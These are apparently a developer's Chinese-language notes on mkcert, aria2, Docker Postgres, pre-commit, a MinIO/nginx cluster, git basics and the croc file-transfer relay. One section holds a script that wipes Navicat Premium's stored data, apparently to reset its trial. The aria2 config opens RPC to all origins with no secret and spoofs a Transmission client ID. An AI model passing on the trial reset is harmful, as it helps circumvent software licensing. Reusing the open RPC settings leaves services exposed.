scoop install mkcert
</code></pre>
<p>或者从源码构建（要求 Go 1.10+） ，或者使用 <a href="https://github.com/FiloSottile/mkcert/releases">预构建的二进制文件</a>。</p>
<p>如果遇到权限问题，请使用管理员运行 <code>mkcert</code></p>
<h2 id="支持的-root-stores"><a class="header" href="#支持的-root-stores">支持的 root stores</a></h2>
<p><code>mkcert</code> 支持以下 root stores：</p>
<ul>
<li>
<p>macOS system store</p>
</li>
<li>
<p>Windows system store</p>
</li>
<li>
<p>Linux 发行版提供</p>
<ul>
<li>
<p><code>update-ca-trust</code> （Fedora，RHEL，CentOS）或者</p>
</li>
<li>
<p><code>update-ca-certificates</code> （Ubuntu，Debian，OpenSUSE，SLES）或者</p>
</li>
<li>
<p><code>trust</code> （Arch）</p>
</li>
</ul>
</li>
<li>
<p>Firefox （仅 macOS 和 Linux）</p>
</li>
<li>
<p>Chrome 和 Chromium</p>
</li>
<li>
<p>Java（当 <code>JAVA_HOME</code> 被设置时）</p>
</li>
</ul>
<p>为了把 local root CA 装到这些 root stores 中，你可以设置 <code>TRUST_STORES</code> 环境变量到一个逗号分隔的 list。有这些选项：&quot;system&quot;,&quot;java&quot; 和 &quot;nss&quot;（包括了 Firefox）。</p>
<h2 id="高级-topics"><a class="header" href="#高级-topics">高级 topics</a></h2>
<hr />
<h3 id="高级选项"><a class="header" href="#高级选项">高级选项</a></h3>
<pre><code class="language-zsh">    -cert-file FILE, -key-file FILE, -p12-file FILE
        自定义输出路径.

    -client
        生成供客户端认证使用的证书.

    -ecdsa
        生成使用一个 ECDSA （一种椭圆曲线签名算法）key 来生成证书.

    -pkcs12
        生成一个 &quot;.p12&quot; PKCS #12 文件，也可以被识别为 &quot;.pfx&quot; 文件,
        包含 cert 和 key for legacy applications.

    -csr CSR
        生成一个给予 CSR（证书签名申请） 的证书。
    与除了 -install 和 -cert-file 以外的其它所以 flag 和参数冲突！
</code></pre>
<p><a href="https://cloud.tencent.com/document/product/400/5367">SSL 证书 什么是CSR？-常见问题-文档中心-腾讯云</a></p>
<blockquote>
<p><strong>请注意！</strong> 你必须把这些选项放在域名列表之前。</p>
</blockquote>
<h3 id="例如"><a class="header" href="#例如">例如</a></h3>
<pre><code class="language-zsh">mkcert -key-file key.pem -cert-file cert.pem example.com *.example.com
</code></pre>
<h3 id="smime-邮件安全证书"><a class="header" href="#smime-邮件安全证书">S/MIME （邮件安全证书）</a></h3>
<p>用下面这种方式 <code>mkcert</code> 会生成一个 S/MIME 证书：</p>
<pre><code class="language-zsh">mkcert filippo@example.com
</code></pre>
<h3 id="移动设备"><a class="header" href="#移动设备">移动设备</a></h3>
<p>对于要让移动设备信任证书的情况，你得安装 root CA。就是 <code>rootCA.pem</code> 这个文件，可以通过 <code>mkcert -CAROOT</code> 打印出这个文件所在的目录。</p>
<p>在 iOS 上，你也可以使用 AirDrop，把 CA 邮件发给你自己，或者通过一个 HTTP server 提供它。在打开它之后，你需要  <a href="https://github.com/FiloSottile/mkcert/issues/233#issuecomment-690110809">install the profile in Settings &gt; Profile Downloaded</a> and then <a href="https://support.apple.com/en-nz/HT204477">enable full trust in it</a> 。</p>
<p>对于 Android ，你得安装这个 CA 然后在应用程序的开发版本中启用 user roots。可以看一看这个 <a href="https://stackoverflow.com/a/22040887/749014">StackOverflow 回答</a> 。</p>
<h3 id="用-nodejs-来使用这个-root"><a class="header" href="#用-nodejs-来使用这个-root">用 Node.js 来使用这个 root</a></h3>
<p>Node 不使用 system root store，所以它不会自动接受 <code>mkcert</code> 证书。相反，你得设置 <a href="https://nodejs.org/api/cli.html#cli_node_extra_ca_certs_file"><code>NODE_EXTRA_CA_CERTS</code></a> 环境变量。</p>
<pre><code class="language-zsh">export NODE_EXTRA_CA_CERTS=&quot;$(mkcert -CAROOT)/rootCA.pem&quot;
</code></pre>
<h3 id="改变-ca-文件的位置"><a class="header" href="#改变-ca-文件的位置">改变 CA 文件的位置</a></h3>
<p>CA 证书和它的 key 被存储在用户家目录的一个文件夹中。一般来说你不会想去关注它的位置，因为它会被自动装载。但是你可以通过 <code>mkcert -CAROOT</code> 来打印这个目录位置。</p>
<p>如果你想要管理单独的 CA 们，你可以使用 <code>\$CAROOT</code> 环境变量来设置 mkcert 放置和寻找 CA files 的路径。</p>
<h3 id="在其它系统上安装-ca"><a class="header" href="#在其它系统上安装-ca">在其它系统上安装 CA</a></h3>
<p>安装 trust store 不需要 CA key（只要 CA），所以你可以导出 CA，并且使用 <code>mkcert</code> 来安装到其它机器上。</p>
<ul>
<li>
<p>找到 <code>rootCA.pem</code> 文件，可以用 <code>mkcert -CAROOT</code> 找到对应目录。</p>
</li>
<li>
<p>把它 copy 到别的机器上。</p>
</li>
<li>
<p>设置 <code>\$CAROOT</code> 为 <code>rootCA.pem</code> 所在目录。</p>
</li>
<li>
<p>运行 <code>mkcert -install</code>(arch linux 可以 <code>sudo trust anchor --store rootCA.pem</code>，其它发行版可以用自带的命令手动添加来信任 CA)</p>
</li>
</ul>
<p>请千万记住 <code>mkcert</code> 是用于开发目的的，不建议用于生产，所以它不应该被用到用户终端上，并且你不应该导出或者共享 <code>rootCA-key.pem</code> 。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="aria2"><a class="header" href="#aria2">aria2</a></h2>
<h3 id="aria2-配置"><a class="header" href="#aria2-配置">aria2 配置</a></h3>
<pre><code class="language-zsh"># 找个地方放 aria2，这里的路径都能按自己需求改，不必跟我保持一致
sudo echo &quot;Aria2&quot; &gt; /etc/hostname
sudo adduser Aria2
su - Aria2
mkdir -p ~/.aria2
cd ~/.aria2 &amp;&amp; touch aria2.conf aria2.session

# 编写 aria2 配置文件
vim ~/.aria2/aria2.conf
## 进度保存相关 ##
# 从会话文件中读取下载任务
input-file=/home/Aria2/.aria2/aria2.session
# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件
save-session=/home/Aria2/.aria2/aria2.session
# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0
save-session-interval=60

## 文件保存相关 ##

# 文件的保存路径, 默认: 当前启动位置
dir=/home/Aria2/download/
# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M
disk-cache=32M
# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc
# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc
# falloc和trunc则需要文件系统和内核支持
# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项
#file-allocation=none
# 断点续传
continue=true

## 下载连接相关 ##

# 最大同时下载任务数, 运行时可修改, 默认:5
max-concurrent-downloads=15
# 同一服务器连接数, 添加时可指定, 默认:1
max-connection-per-server=5
# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M
# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载
min-split-size=10M
# 单个任务最大线程数, 添加时可指定, 默认:5
split=16
# 整体下载速度限制, 运行时可修改, 默认:0
#max-overall-download-limit=0
# 单个任务下载速度限制, 默认:0
#max-download-limit=0
# 整体上传速度限制, 运行时可修改, 默认:0
#max-overall-upload-limit=0
# 单个任务上传速度限制, 默认:0
#max-upload-limit=0
# 禁用IPv6, 默认:false
#disable-ipv6=true
# 连接超时时间, 默认:60
#timeout=60
# 最大重试次数, 设置为0表示不限制重试次数, 默认:5
#max-tries=5
# 设置重试等待的秒数, 默认:0
#retry-wait=0

## RPC相关设置 ##

# 启用RPC, 默认:false
enable-rpc=true
# 允许所有来源, 默认:false
rpc-allow-origin-all=true
# 允许非外部访问, 默认:false
rpc-listen-all=true
# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同
#event-poll=select
# RPC监听端口, 端口被占用时可以修改, 默认:6800
#rpc-listen-port=6800
# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项
#rpc-secret=&lt;TOKEN&gt;
# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项
#rpc-user=&lt;USER&gt;
# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项
#rpc-passwd=&lt;PASSWD&gt;
# 是否启用 RPC 服务的 SSL/TLS 加密,
# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接
#rpc-secure=true
# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,
# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥
#rpc-certificate=/path/to/certificate.pem
# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件
#rpc-private-key=/path/to/certificate.key

## BT/PT下载相关 ##

# 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true
#follow-torrent=true
# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999
listen-port=51413
# 单个种子最大连接数, 默认:55
#bt-max-peers=55
# 打开DHT功能, PT需要禁用, 默认:true
enable-dht=false
# 打开IPv6 DHT功能, PT需要禁用
#enable-dht6=false
# DHT网络监听端口, 默认:6881-6999
#dht-listen-port=6881-6999
# 本地节点查找, PT需要禁用, 默认:false
#bt-enable-lpd=false
# 种子交换, PT需要禁用, 默认:true
enable-peer-exchange=false
# 每个种子限速, 对少种的PT很有用, 默认:50K
#bt-request-peer-speed-limit=50K
# 客户端伪装, PT需要
peer-id-prefix=-TR2770-
user-agent=Transmission/2.77
# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0
seed-ratio=0
# 强制保存会话, 即使任务已经完成, 默认:false
# 较新的版本开启后会在任务完成后依然保留.aria2文件
#force-save=false
# BT校验相关, 默认:true
#bt-hash-check-seed=true
# 继续之前的BT任务时, 无需再次校验, 默认:false
bt-seed-unverified=true
# 保存磁力链接元数据为种子文件(.torrent文件), 默认:false
bt-save-metadata=true
# tracker,wget https://trackerslist.com/best_aria2.txt -O - |awk NF
#bt-tracker=traker1,traker2
</code></pre>
<h3 id="开机自启"><a class="header" href="#开机自启">开机自启</a></h3>
<pre><code class="language-zsh"># 创建 service 文件
tee ~/.aria2/aria2.service &lt;&lt;EOF
[Unit]
Description=Aria2 Service
After=network.target
Wants=network.target
[Install]
WantedBy=multi-user.target

[Service]
# 使用当前用户运行程序
User=$USER
Group=$USER
Type=simple
PIDFile=/run/aria2.pid
ExecStart=/usr/bin/aria2c --conf-path $HOME/.aria2/aria2.conf
Restart=on-failure
EOF

# 加入 Systemd
sudo ln -s ${HOME}/.aria2/aria2.service /lib/systemd/system/
# 重新加载 unit 文件
sudo systemctl daemon-reload
# 开启开机自启，并启用服务
sudo systemctl enable --now aria2
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="postgres"><a class="header" href="#postgres">Postgres</a></h1>
<h2 id="利用-docker-快速在-当前工作目录pwd-启动一个本地-postgres-环境"><a class="header" href="#利用-docker-快速在-当前工作目录pwd-启动一个本地-postgres-环境">利用 Docker 快速在 <strong>当前工作目录(<code>pwd</code>)</strong> 启动一个本地 postgres 环境</a></h2>
<p>使用 alpine based image，并且挂载了 unix socket。</p>
<pre><code class="language-bash">\$ mkdir conf
\$ docker run -i --rm postgres:15-alpine cat /usr/local/share/postgresql/postgresql.conf.sample &gt; conf/postgresql.conf
\$ docker run -d \
-v `pwd`/conf/postgresql.conf:/etc/postgresql/postgresql.conf \
-v `pwd`/data:/var/lib/postgresql/data \
-v /var/run/postgresql:/var/run/postgresql \
-p 5432:5432 \
-e POSTGRES_USER=&lt;YOUR USER NAME&gt; \
-e LANG=zh_CN.utf8 \
-e POSTGRES_INITDB_ARGS=&quot;--locale-provider=icu --icu-locale=zh-CN&quot; \
-e POSTGRES_PASSWORD=&lt;YOUR PASSWORD&gt; \
postgres:15-alpine -c 'config_file=/etc/postgresql/postgresql.conf'
</code></pre>
<h2 id="使用-pgcli-来获得拥有更友好的客户端"><a class="header" href="#使用-pgcli-来获得拥有更友好的客户端">使用 <code>pgcli</code> 来获得拥有更友好的客户端</a></h2>
<pre><code class="language-bash">\$ sudo pacman -S pgcli
# -or-
\$ sudo apt-get install pgcli
# -or-
\$ brew install pgcli
# -or-
\$ pip install -U pgcli
</code></pre>
<h3 id="默认启动直接通过-unix-socket-连接-postgres"><a class="header" href="#默认启动直接通过-unix-socket-连接-postgres">默认启动直接通过 unix socket 连接 postgres</a></h3>
<pre><code class="language-bash">\$ pgcli
Server: PostgreSQL 15.1
Version: 3.5.0
Home: http://pgcli.com
m4n5ter&gt; exit
Goodbye!
</code></pre>
<h3 id="linux-navicat-reset"><a class="header" href="#linux-navicat-reset">linux navicat reset</a></h3>
<p>下面的方法不会丢失已经存在连接(Navicat 16 Premium)：</p>
<pre><code class="language-bash">#!/bin/bash

# Backup
cp ~/.config/dconf/user ~/.config/dconf/user.bk
cp ~/.config/navicat/Premium/preferences.json ~/.config/navicat/Premium/preferences.json.bk

# Clear data in dconf
dconf reset -f /com/premiumsoft/navicat-premium/
# Remove data fields in config file
sed -i -E 's/,?&quot;([A-Z0-9]+)&quot;:\{([^\}]+)},?//g' ~/.config/navicat/Premium/preferences.json## Links
</code></pre>
<ul>
<li><a href="https://www.postgresql.org/docs/current">Postgres Current Version Document</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pre-commit"><a class="header" href="#pre-commit">pre-commit</a></h1>
<p>一个用于 git commit 提交自动前处理自定义操作的工具</p>
<h2 id="安装-2"><a class="header" href="#安装-2">安装</a></h2>
<pre><code class="language-bash">\$ pip3 install pre-commit
</code></pre>
<h2 id="示例"><a class="header" href="#示例">示例</a></h2>
<pre><code class="language-bash">\$ mkdir example-registry &amp;&amp; cd example-registry
\$ git init
\$ touch .pre-commit-config.yaml
......
</code></pre>
<p>.pre-commit-config.yaml:</p>
<pre><code class="language-yaml">fail_fast: false
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v2.3.0
    hooks:
      - id: check-byte-order-marker
      - id: check-case-conflict
      - id: check-merge-conflict
      - id: check-symlinks
      - id: check-yaml
      - id: end-of-file-fixer
      - id: mixed-line-ending
      - id: trailing-whitespace
  - repo: https://github.com/psf/black
    rev: 19.3b0
    hooks:
      - id: black
  - repo: https://github.com/crate-ci/typos
    rev: v1.8.1
    hooks:
      - id: typos
  - repo: local
    hooks:
      - id: cargo-fmt
        name: cargo fmt
        description: Format files with rustfmt.
        entry: bash -c 'cargo fmt -- --check'
        language: rust
        files: \.rs\$
        args: []
      - id: cargo-deny
        name: cargo deny check
        description: Check cargo dependencies
        entry: bash -c 'cargo deny check'
        language: rust
        files: \.rs\$
        args: []
      - id: cargo-check
        name: cargo check
        description: Check the package for errors.
        entry: bash -c 'cargo check --all'
        language: rust
        files: \.rs\$
        pass_filenames: false
      - id: cargo-clippy
        name: cargo clippy
        description: Lint rust sources
        entry: bash -c 'cargo clippy --all-targets --all-features --tests --benches -- -D warnings'
        language: rust
        files: \.rs\$
        pass_filenames: false
      - id: cargo-test
        name: cargo test
        description: unit test for the project
        entry: bash -c 'cargo nextest run --all-features'
        language: rust
        files: \.rs\$
        pass_filenames: false

</code></pre>
<pre><code class="language-bash"># 这将会在 .git 内创建 hooks，来保证在 git commit 之前顺序执行 .pre-commit-config.yaml 中定义的步骤
\$ pre-commit install
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="docker-compose-示例"><a class="header" href="#docker-compose-示例">Docker compose 示例</a></h2>
<p><strong>docker-compose.yml</strong></p>
<pre><code class="language-yaml">version: '3.7'

#Settings and configurations that are common for all containers

x-minio-common: &amp;minio-common
 # set your minio version
 image: quay.io/minio/minio:RELEASE.2022-10-15T19-57-03Z
 restart: unless-stopped
 command: server --console-address &quot;:9001&quot; http://minio{1...4}/data{1...2}
 expose:
 - &quot;9000&quot;
 - &quot;9001&quot;
 environment:
 MINIO_ROOT_USER: &lt;YOUR MINIO ROOT USER&gt;
 MINIO_ROOT_PASSWORD: &lt;YOUR MINIO ROOT PASSWORD&gt;
 healthcheck:
 test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;]
 interval: 30s
 timeout: 20s
 retries: 3 
# starts 4 docker containers running minio server instances.
# using nginx reverse proxy, load balancing, you can access
# it through port 9000.
services:
 minio1:
 &lt;&lt;: *minio-common
 hostname: minio1
 volumes:
 - data1-1:/data1
 - data1-2:/data2 
minio2:
 &lt;&lt;: *minio-common
 hostname: minio2
 volumes:
 - data2-1:/data1
 - data2-2:/data2 
minio3:
 &lt;&lt;: *minio-common
 hostname: minio3
 volumes:
 - data3-1:/data1
 - data3-2:/data2 
minio4:
 &lt;&lt;: *minio-common
 hostname: minio4
 volumes:
 - data4-1:/data1
 - data4-2:/data2 
nginx:
 image: nginx:1.19.2-alpine
 hostname: minio_gateway
 volumes:
 - ./nginx.conf:/etc/nginx/nginx.conf:ro
 ports:
 - &quot;9000:9000&quot;
 - &quot;80:80&quot;
 depends_on:
 - minio1
 - minio2
 - minio3
 - minio4 
## By default this config uses default local driver,
## For custom volumes replace with volume driver configuration.
volumes:
 data1-1:
 data1-2:
 data2-1:
 data2-2:
 data3-1:
 data3-2:
 data4-1:
 data4-2:
</code></pre>
<p><strong>nginx.conf</strong></p>
<pre><code class="language-nginx">worker_processes  auto;

events {
    worker_connections  1024;
}


stream {
        #log_format basic '\$remote_addr [\$time_local] '
        #         '\$protocol \$status \$bytes_sent \$bytes_received '
        #         '\$session_time';
        #access_log /var/log/nginx/stream-access.log basic buffer=32k;


        upstream minio{
            server minio1:9000 weight=1;
            server minio2:9000 weight=1;
            server minio3:9000 weight=1;
            server minio4:9000 weight=1;
    }

        upstream minio_console{
            server minio1:9001 weight=1;
            server minio2:9001 weight=1;
            server minio3:9001 weight=1;
            server minio4:9001 weight=1;
    }

    server{
        listen 9003;
        proxy_pass minio;
    }

    server{
        listen 80;
        proxy_pass minio_console;
    }
}

http {
    server{
        listen 9000;
        # 允许 header 中包含特殊字符
         ignore_invalid_headers off;
         # 允许上传任意大小的文件
         # 可以把值改成像 1000m 这样来限制文件的大小
         client_max_body_size 0;
         # 禁用缓冲
         proxy_buffering off;
        # 允许跨域
        add_header Access-Control-Allow-Origin * always;
        add_header Access-Control-Allow-Headers *;
        add_header Access-Control-Allow-Methods &quot;GET, POST, PUT, OPTIONS&quot;;
        add_header Access-Control-Allow-Methods *;

         location / {
               proxy_set_header X-Real-IP \$remote_addr;
               proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
               proxy_set_header X-Forwarded-Proto \$scheme;
               proxy_set_header Host \$http_host; # 主要是此处，保护 host header

               proxy_connect_timeout 300;
               # 默认是 HTTP/1, keepalive 需要 HTTP/1.1
               proxy_http_version 1.1;
               proxy_set_header Connection &quot;&quot;;
               chunked_transfer_encoding off;
                proxy_pass http://localhost:9003;
        }

    }
}
</code></pre>
<h2 id="快速启动"><a class="header" href="#快速启动">快速启动</a></h2>
<p>将 <code>docker-compose.yml</code> 与 <code>nginx.conf</code> 置于统一目录下，然后执行：</p>
<pre><code class="language-bash">\$ docker compose up -d
# -or-
\$ docker-compose up -d
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="git-基本操作"><a class="header" href="#git-基本操作">Git 基本操作</a></h1>
<p>下面介绍常见的 git 使用姿势：</p>
<p><strong>1.初始化本地仓库</strong></p>
<pre><code>git init &lt;directory&gt;
</code></pre>
<p><code>&lt;directory&gt;</code> 是可选的，如果不指定，将使用当前目录。</p>
<p><strong>2.克隆一个远程仓库</strong></p>
<pre><code>git clone &lt;url&gt;
</code></pre>
<p><strong>3.添加文件到暂存区</strong></p>
<pre><code>git add &lt;file&gt;
</code></pre>
<p>要添加当前目录中的所有文件，请使用 . 代替 <code>&lt;file&gt;</code>,代码如下：</p>
<pre><code>git add .
</code></pre>
<p><strong>4. 提交更改</strong></p>
<pre><code>git commit -m &quot;&lt;message&gt;&quot;
</code></pre>
<p>如果要添加对跟踪文件所做的所有更改并提交。</p>
<pre><code>git commit -a -m &quot;&lt;message&gt;&quot;
</code></pre>
<p><strong>5.从暂存区删除一个文件</strong></p>
<pre><code>git reset &lt;file&gt;
</code></pre>
<p><strong>6.移动或重命名文件</strong></p>
<pre><code>git mv &lt;current path&gt; &lt;new path&gt;
</code></pre>
<p><strong>7. 从存储库中删除文件</strong></p>
<pre><code>git rm &lt;file&gt;
</code></pre>
<p>您也可以仅使用 <code>--cached</code> 标志将其从暂存区中删除</p>
<pre><code>git rm --cached &lt;file&gt;
</code></pre>
<p><strong>基本 Git 概念</strong></p>
<p><strong>8.默认分支名称：main</strong></p>
<p><strong>9.默认远程名称：origin</strong></p>
<p><strong>10.当前分支参考：HEAD</strong></p>
<p><strong>11. HEAD 的父级：HEAD^ 或 HEAD~1</strong></p>
<p><strong>12. HEAD 的祖父母：HEAD^^ 或 HEAD~2</strong></p>
<p><strong>13. 显示分支</strong></p>
<pre><code>git branch
</code></pre>
<p><strong>有用的标志：</strong></p>
<p><code>-a</code>：显示所有分支（本地和远程）</p>
<p><code>-r</code>：显示远程分支</p>
<p><code>-v</code>：显示最后一次提交的分支</p>
<p><strong>14.创建一个分支</strong></p>
<pre><code>git branch &lt;branch&gt;
</code></pre>
<p>你可以创建一个分支并使用 <code>checkout</code> 命令切换到它。</p>
<pre><code>git checkout -b &lt;branch&gt;
</code></pre>
<p><strong>15.切换到一个分支</strong></p>
<pre><code>git checkout &lt;branch&gt;
</code></pre>
<p><strong>16.删除一个分支</strong></p>
<pre><code>git branch -d &lt;branch&gt;
</code></pre>
<p>您还可以使用 <code>-D</code> 标志强制删除分支。</p>
<pre><code>git branch -D &lt;branch&gt;
</code></pre>
<p><strong>17.合并分支</strong></p>
<pre><code>git merge &lt;branch to merge into HEAD&gt;
</code></pre>
<p><strong>有用的标志：</strong></p>
<p><code>--no-ff</code>：即使合并解析为快进，也创建合并提交</p>
<p><code>--squash</code>：将指定分支中的所有提交压缩为单个提交</p>
<p>建议不要使用 <code>--squash</code> 标志，因为它会将所有提交压缩为单个提交，从而导致提交历史混乱。</p>
<p><strong>18. 变基分支</strong></p>
<p>变基是将一系列提交移动或组合到新的基本提交的过程。</p>
<pre><code>git rebase &lt;branch to rebase from&gt;
</code></pre>
<p><strong>19. 查看之前的提交</strong></p>
<pre><code>git checkout &lt;commit id&gt;
</code></pre>
<p><strong>20. 恢复提交</strong></p>
<pre><code>git revert &lt;commit id&gt;
</code></pre>
<p><strong>21. 重置提交</strong></p>
<pre><code>git reset &lt;commit id&gt;
</code></pre>
<p>您还可以添加 <code>--hard</code> 标志来删除所有更改，但请谨慎使用。</p>
<pre><code>git reset --hard &lt;commit id&gt;
</code></pre>
<p><strong>22.查看存储库的状态</strong></p>
<pre><code>git status
</code></pre>
<p><strong>23.显示提交历史</strong></p>
<pre><code>git log
</code></pre>
<p><strong>24.显示对未暂存文件的更改</strong></p>
<pre><code>git diff
</code></pre>
<p>您还可以使用 <code>--staged</code> 标志来显示对暂存文件的更改。</p>
<pre><code>git diff --staged
</code></pre>
<p><strong>25.显示两次提交之间的变化</strong></p>
<pre><code>git diff &lt;commit id 01&gt; &lt;commit id 02&gt;
</code></pre>
<p><strong>26. 存储更改</strong></p>
<p><code>stash</code> 允许您在不提交更改的情况下临时存储更改。</p>
<pre><code>git stash
</code></pre>
<p>您还可以将消息添加到存储中。</p>
<pre><code>git stash save &quot;&lt;message&gt;&quot;
</code></pre>
<p><strong>27. 列出存储</strong></p>
<pre><code>git stash list
</code></pre>
<p><strong>28.申请一个藏匿处</strong></p>
<p>应用存储不会将其从存储列表中删除。</p>
<pre><code>git stash apply &lt;stash id&gt;
</code></pre>
<p>如果不指定 <code>&lt;stash id&gt;</code>，将应用最新的 <code>stash</code>（适用于所有类似的 <code>stash</code> 命令）</p>
<p>您还可以使用格式 <code>stash@{&lt;index&gt;}</code> 应用存储（适用于所有类似的存储命令）</p>
<pre><code>git stash apply stash@{0}
</code></pre>
<p><strong>29.删除一个藏匿处</strong></p>
<pre><code>git stash drop &lt;stash id&gt;
</code></pre>
<p><strong>30.删除所有藏匿处</strong></p>
<pre><code>git stash clear
</code></pre>
<p><strong>31. 应用和删除存储</strong></p>
<pre><code>git stash pop &lt;stash id&gt;
</code></pre>
<p><strong>32.显示存储中的更改</strong></p>
<pre><code>git stash show &lt;stash id&gt;
</code></pre>
<p><strong>33.添加远程仓库</strong></p>
<pre><code>git remote add &lt;remote name&gt; &lt;url&gt;
</code></pre>
<p><strong>34. 显示远程仓库</strong></p>
<pre><code>git remote
</code></pre>
<p>添加 <code>-v</code> 标志以显示远程存储库的 URL。</p>
<pre><code>git remote -v
</code></pre>
<p><strong>35.删除远程仓库</strong></p>
<pre><code>git remote remove &lt;remote name&gt;
</code></pre>
<p><strong>36.重命名远程存储库</strong></p>
<pre><code>git remote rename &lt;old name&gt; &lt;new name&gt;
</code></pre>
<p><strong>37. 从远程存储库中获取更改</strong></p>
<pre><code>git fetch &lt;remote name&gt;
</code></pre>
<p><strong>38. 从特定分支获取更改</strong></p>
<pre><code>git fetch &lt;remote name&gt; &lt;branch&gt;
</code></pre>
<p><strong>39. 从远程存储库中拉取更改</strong></p>
<pre><code>git pull &lt;remote name&gt; &lt;branch&gt;
</code></pre>
<p><strong>40.将更改推送到远程存储库</strong></p>
<pre><code>git push &lt;remote name&gt;
</code></pre>
<p><strong>41.将更改推送到特定分支</strong></p>
<pre><code>git push &lt;remote name&gt; &lt;branch&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="croc"><a class="header" href="#croc"><a href="https://github.com/schollz/croc">croc</a></a></h1>
<p>一个由 <a href="https://github.com/schollz">schollz</a> 开发的<strong>端到端加密</strong>、<strong>无需服务器或端口转发</strong>、可传输多文件、可从意外中断中恢复传输（断点续传）、可在<strong>任意</strong>两台计算机直接传输文件的命令行工具。由于 <code>croc</code> 使用 GO 开发，所以天然具有跨平台功能。</p>
<p>schollz 开发此工具时的设计理念可在他 2019 年撰写的 <a href="https://schollz.com/blog/croc6/">croc</a> 查看。</p>
<h2 id="relay--uploading"><a class="header" href="#relay--uploading">relay &gt; uploading</a></h2>
<p>relay &gt; uploading 是在上方那篇博客中提到的一个重要理念，<code>croc</code> 使用<strong>中继</strong>而不是上传的方式来进行文件传输。</p>
<p>我在一开始使用 <code>croc send &lt;file&gt;</code> 时还曾思考（当时还没有看到 croc 使用 <code>relay</code>）为何这条命令并没有携带任何关于传输给<strong>谁</strong>的参数，例如：</p>
<pre><code class="language-bash">\$ croc send cv_debug.log
Sending 'cv_debug.log' (282 B)   
Code is: 2151-school-biscuit-snow
On the other computer run

croc 2151-school-biscuit-snow
</code></pre>
<p><code>croc</code> 仅仅告诉我，去另一条计算机上执行 <code>croc 2151-school-biscuit-snow</code>。在没有查看任何详细文档的情况下，以这种方式完成了一次文件传输，这让我感到非常惊讶——文件提供方没有指出要将文件发送到哪儿，文件接收方也没有提供要从哪儿接收文件，仅凭 <code>croc</code> 给出的 <code>2151-school-biscuit-snow</code> code 就得到了文件。</p>
<p>为了弄明白 <code>croc send</code> 的默认行为（文档比较简单，并没有给出相关说明），让我们看下 <code>croc</code> 的源码（写这篇文章时的提交是 <a href="https://github.com/schollz/croc/commit/cd6eb1ba53ec36a27cf8a2ac5a8b700be3e83ce3"><code>cd6eb1ba53ec36a27cf8a2ac5a8b700be3e83ce3</code></a>），在路径 <code>croc/src/cli/cli.go lines: 196~200</code>:</p>
<pre><code class="language-go">    if crocOptions.RelayAddress != models.DEFAULT_RELAY {
        crocOptions.RelayAddress6 = &quot;&quot;
    } else if crocOptions.RelayAddress6 != models.DEFAULT_RELAY6 {
        crocOptions.RelayAddress = &quot;&quot;
    }
</code></pre>
<p><code>models.DEFAULT_RELAY</code> 和 <code>models.DEFAULT_RELAY6</code> 的内容分别是 <code>&quot;croc.schollz.com&quot;</code> 和 <code>&quot;croc6.schollz.com&quot;</code> 。</p>
<p>从这就能看出 <code>relay</code> 并不是真正意义上的无服务器，仍然需要需要一台发送者和接收者都能发现的中继服务器，而 schollz 本人提供了默认的中继服务器。</p>
<p>中继服务器不需要提供真实的服务，正如其名，它仅仅只是负责中继（写到这时我并没有详细阅读 <code>croc</code> 源码，我猜测应该是像 <code>P2P</code> 一样使用类似 DNS hole-punch 的技术来让端对端彼此能够发现彼此）。</p>
<p><code>croc</code> 也提供了指定 <code>relay</code> 的参数，具体细节可以通过在<strong>命令/子命令</strong>后添加 <code>--help</code> 来查看。</p>
<h2 id="relay-是如何工作的"><a class="header" href="#relay-是如何工作的">relay 是如何工作的</a></h2>
<p>两端（指发送端和接收端）会连接到 relay（中继服务器），由 relay 为两端创建一个房间，该房间可容纳两个连接。连接会告诉中继服务器它需要一个房间，如果房间不存在就会创建一个新房间，如果房间已经存在并且没有满员，relay 就会将这条连接加入到它需要的房间（本情况说明这条连接是接收端，因为它想要的房间已经存在了，那个房间就是发送端向 relay 申请的房间）。</p>
<p>当两端都连接到 relay 时（即两端都进入了房间），relay 会为两端的连接提供一个全双工的通道，实现细节在 <code>croc/src/tcp lines: 388~411</code>:</p>
<pre><code class="language-go">func pipe(conn1 net.Conn, conn2 net.Conn) {
    chan1 := chanFromConn(conn1)
    chan2 := chanFromConn(conn2)

    for {
        select {
            case b1 := &lt;-chan1:
            if b1 == nil {
                return
            }
            if _, err := conn2.Write(b1); err != nil {
                log.Errorf(&quot;write error on channel 1: %v&quot;, err)
            }

            case b2 := &lt;-chan2:
            if b2 == nil {
                return
            }
            if _, err := conn1.Write(b2); err != nil {
                log.Errorf(&quot;write error on channel 2: %v&quot;, err)
            }
        }
    }
}
</code></pre>
